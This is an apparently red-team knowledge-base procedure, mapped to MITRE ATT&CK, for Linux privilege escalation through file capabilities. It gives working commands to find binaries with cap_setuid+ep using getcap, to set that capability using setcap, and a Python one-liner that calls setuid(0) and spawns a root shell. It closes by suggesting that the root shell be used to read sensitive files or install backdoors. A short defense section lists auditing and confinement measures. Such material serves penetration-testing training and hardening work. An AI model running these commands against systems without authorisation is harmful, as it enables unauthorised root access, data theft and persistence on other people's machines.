---
id: 6b48dbb2-3cb8-47aa-8d53-25d107f3a422
name: Linux-Privilege-Escalation-via-Capabilities
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:18.928420+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
  - >-
    [[techniques/Exploitation for Privilege Escalation|T1068 - Exploitation for
    Privilege Escalation]]
sub_techniques: []
tags:
  - '[[tags/Linux - Privilege Escalation]]'
  - '[[tags/Capabilities]]'
commands:
  - '[[commands/getcap-check-binary-capabilities]]'
  - '[[commands/setcap-set-capability-on-binary]]'
  - '[[commands/python-escalate-to-root-shell]]'
platforms:
  - Linux
tools: []
validated: true
---

# Linux-Privilege-Escalation-via-Capabilities

## Summary

This procedure demonstrates how to enumerate Linux binaries with elevated capabilities, such as cap_setuid+ep, and exploit them to achieve root privileges. Capabilities allow fine-grained control over privileges without full setuid root binaries, but misconfigurations can enable privilege escalation by allowing a process to set its effective UID to 0 (root).

## Description

Linux capabilities divide traditional root privileges into smaller units, assigned to binaries via tools like setcap. Attackers can check for binaries with dangerous capabilities like cap_setuid (allows changing UID) or cap_dac_override (bypasses file permissions). A common exploitation path involves finding a binary like Python with cap_setuid+ep, then running code to setuid(0) and spawn a root shell. This is useful in post-exploitation scenarios on compromised Linux hosts where full root is needed for persistence or data exfiltration. The procedure assumes user-level shell access and focuses on enumeration and exploitation; setting capabilities requires prior elevated access or misconfiguration.

## Requirements

1. Shell access to a Linux system with user-level privileges.
2. Installed libcap package (provides getcap and setcap commands; typically available on most distributions).
3. Python 2.7 or similar binary that can be targeted (common on older systems).
4. Write access to binaries if setting capabilities (rare in privesc, but included for completeness).

## Defense

- Regularly audit binary capabilities using getcap on critical paths and remove unnecessary ones with setcap -r.
- Enforce principle of least privilege: Avoid assigning cap_setuid or similar to non-essential binaries.
- Monitor for anomalous root processes spawned from user binaries via auditd or sysdig.
- Use AppArmor or SELinux to confine processes even with capabilities.

## Objectives

1. Identify binaries with exploitable capabilities like cap_setuid+ep.
2. Exploit the capability to elevate to root privileges.
3. Spawn a root shell for further actions.

## Instructions

### Step 1: Enumerate Binary Capabilities

**Context**: Start by checking common binaries for elevated capabilities. Focus on interpreters like Python or system tools that might have cap_setuid+ep, allowing UID manipulation.

**Command** ([[commands/getcap-check-binary-capabilities]]):
```bash
getcap $_BINARY
```

> Run this on suspects like /usr/bin/python2.7 or /usr/bin/openssl. Look for output like "= cap_setuid+ep" indicating the binary can set effective UID with permitted capabilities. If none found, proceed to other privesc vectors.

### Step 2: Set Capability on Target Binary (If Misconfiguration Allows)

**Context**: If you have temporary elevated access (e.g., via sudo without password), set cap_setuid+ep on a binary like Python to enable exploitation. This step is typically for lab setup, as real privesc assumes existing misconfigs.

**Command** ([[commands/setcap-set-capability-on-binary]]):
```bash
sudo setcap cap_setuid+ep $_BINARY
```

> Replace $_BINARY with /usr/bin/python2.7. Verify with getcap afterward. Success grants the binary the ability to escalate UIDs.

### Step 3: Exploit Capability for Root Shell

**Context**: With cap_setuid+ep on the binary, execute Python code to set the effective UID to 0 and spawn a shell. This bypasses traditional setuid requirements.

**Command** ([[commands/python-escalate-to-root-shell]]):
```bash
python2.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

> This imports os, sets UID to root, and runs /bin/sh. Expected: A root prompt (uid=0(root)). Use whoami or id to confirm.

### Step 4: Verify and Maintain Access

**Context**: After escalation, confirm privileges and stabilize the shell.

Run:
```bash
id
whoami
```

> Output should show uid=0(root). From the root shell, you can read sensitive files or install backdoors.
